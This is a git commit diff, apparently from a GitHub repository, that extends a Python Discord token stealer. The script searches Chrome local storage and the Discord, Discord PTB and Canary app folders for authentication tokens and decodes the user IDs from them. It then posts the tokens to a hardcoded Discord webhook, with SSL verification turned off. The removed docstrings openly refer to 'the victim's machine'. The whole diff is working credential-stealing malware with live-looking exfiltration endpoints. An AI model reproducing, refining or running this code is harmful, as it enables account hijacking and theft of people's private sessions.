580e872dcada99bf30936a102e078532a8822d09
SueNerve <146601138+SueNeve@users.noreply.github.com>
2024-06-17 03:27:01 +0300

    Update main.py

--- main.py
+++ main.py
@@ -4,17 +4,19 @@ import base64
 import typing
 import json
 import urllib.request
-
+import ssl
 
 TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
 REQUEST_HEADERS = {
-    "Content-Type":
-        "application/json",
-    "User-Agent":
-        "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
 }
-WEBHOOK_URL = "https://discord.com/api/webhooks/1252045737890418778/5Th7fp5afGzf5HWxoiIJ_XGPz2uhmtpXd_T2efbRoXEjTKO6fmbQWVIQiVBrdNM9J6qo"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1252050710816755803/-jftESNbDwFwD8988-UEGeKmRpcGnCJhM-yquBj3Wvwtid1NW8KEYkk6Vt_30SlBfvjq"
 
+# تعطيل التحقق من شهادة SSL
+context = ssl.create_default_context()
+context.check_hostname = False
+context.verify_mode = ssl.CERT_NONE
 
 def make_post_request(api_url: str, data: typing.Dict[str, str]) -> int:
     request = urllib.request.Request(
@@ -22,19 +24,19 @@ def make_post_request(api_url: str, data: typing.Dict[str, str]) -> int:
         headers=REQUEST_HEADERS
     )
 
-    with urllib.request.urlopen(request) as response:
+    # تعطيل التحقق من شهادة SSL أثناء فتح الرابط
+    with urllib.request.urlopen(request, context=context) as response:
         response_status = response.status
 
     return response_status
 
 
 def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
-
-    with open(file_path, encoding="utf-8", errors="ignore") as text_file:
-        try:
+    try:
+        with open(file_path, encoding="utf-8", errors="ignore") as text_file:
             file_contents = text_file.read()
-        except PermissionError:
-            return None
+    except PermissionError:
+        return None
 
     tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
 
@@ -42,21 +44,6 @@ def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
 
 
 def get_user_id_from_token(token: str) -> typing.Union[None, str]:
-    """
-    Confirming that the portion of a string before the first dot can be decoded
-    from base64 offers a useful, though not infallible, method for identifying
-    potential Discord tokens. This is informed by the fact that the initial
-    segment of a Discord token usually encodes the user ID in base64. However,
-    this test is not guaranteed to be 100% accurate in every case.
-
-    Parameters:
-        token (str): Suspected Discord token represented as a string.
-
-    Returns:
-        A string representing the Discord user ID to which the token belongs,
-        if the first part of the token can be successfully decoded. Otherwise,
-        None.
-    """
     try:
         discord_user_id = base64.b64decode(
             token.split(".", maxsplit=1)[0] + "=="
@@ -68,41 +55,26 @@ def get_user_id_from_token(token: str) -> typing.Union[None, str]:
 
 
 def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
-    """
-    The function collects discord tokens for each user ID to manage the
-    occurrence of both valid and expired Discord tokens, which happens when a
-    user updates their password, triggering a change in their token. Lacking
-    the capability to differentiate between valid and expired tokens without
-    making queries to the Discord API, the function compiles every discovered
-    token into the returned set. It is designed for these tokens to be
-    validated later, in a process separate from the initial collection and not
-    on the victim's machine.
-
-    Parameters:
-        base_path (str): path containing files where tokens may be located.
-    """
-    file_paths = [
-        os.path.join(base_path, filename) for filename in os.listdir(base_path)
-    ]
-
     id_to_tokens: typing.Dict[str, set] = dict()
 
-    for file_path in file_paths:
-        potential_tokens = get_tokens_from_file(file_path)
+    for root, _, files in os.walk(base_path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            potential_tokens = get_tokens_from_file(file_path)
 
-        if potential_tokens is None:
-            continue
-
-        for potential_token in potential_tokens:
-            discord_user_id = get_user_id_from_token(potential_token)
-
-            if discord_user_id is None:
+            if potential_tokens is None:
                 continue
 
-            if discord_user_id not in id_to_tokens:
-                id_to_tokens[discord_user_id] = set()
+            for potential_token in potential_tokens:
+                discord_user_id = get_user_id_from_token(potential_token)
 
-            id_to_tokens[discord_user_id].add(potential_token)
+                if discord_user_id is None:
+                    continue
+
+                if discord_user_id not in id_to_tokens:
+                    id_to_tokens[discord_user_id] = set()
+
+                id_to_tokens[discord_user_id].add(potential_token)
 
     return id_to_tokens if id_to_tokens else None
 
@@ -110,14 +82,6 @@ def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
 def send_tokens_to_webhook(
     webhook_url: str, user_id_to_token: typing.Dict[str, set[str]]
 ) -> int:
-    """
-    Caution: In scenarios where the victim has logged into multiple Discord
-    accounts or has frequently changed their password, the accumulation of
-    tokens may result in a message that surpasses the character limit,
-    preventing it from being sent. There are no plans to introduce code
-    modifications to segment the message for compliance with character
-    constraints.
-    """
     fields: list[dict] = list()
 
     for user_id, tokens in user_id_to_token.items():
@@ -132,15 +96,38 @@ def send_tokens_to_webhook(
 
 
 def main() -> None:
+    paths = []
 
-    chrome_path = os.path.join(
+    # Add paths for default Chrome profile
+    chrome_default_path = os.path.join(
         os.getenv("LOCALAPPDATA"),
         r"Google\Chrome\User Data\Default\Local Storage\leveldb"
     )
+    if os.path.exists(chrome_default_path):
+        paths.append(chrome_default_path)
 
-    tokens = get_tokens_from_path(chrome_path)
+    # Add paths for Discord, Discord PTB, and Discord Canary
+    discord_paths = [
+        os.path.join(os.getenv("APPDATA"), r"discord"),
+        os.path.join(os.getenv("APPDATA"), r"discordptb"),
+        os.path.join(os.getenv("APPDATA"), r"discordcanary")
+    ]
+    for discord_path in discord_paths:
+        if os.path.exists(discord_path):
+            paths.append(discord_path)
 
-    if tokens is None:
+    tokens = {}
+
+    for path in paths:
+        path_tokens = get_tokens_from_path(path)
+
+        if path_tokens:
+            for user_id, user_tokens in path_tokens.items():
+                if user_id not in tokens:
+                    tokens[user_id] = set()
+                tokens[user_id].update(user_tokens)
+
+    if not tokens:
         return
 
     send_tokens_to_webhook(WEBHOOK_URL, tokens)
